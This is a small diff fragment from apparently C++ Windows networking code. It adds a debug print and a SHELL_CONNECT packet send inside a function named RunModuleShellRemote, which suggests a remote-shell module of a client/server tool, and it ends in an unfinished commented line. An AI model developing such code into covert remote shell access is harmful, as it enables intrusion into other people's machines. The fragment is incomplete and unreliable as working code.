@@ -39,6 +39,10 @@ DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
 	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
 
 	pChildSocketClient->StartSocketClient();
+	printf("CONNECT packet\n");
+	pChildSocketClient->SendPacket(SHELL_CONNECT, NULL, 0);
+
+	//pChildSocketClient->
 
 
 
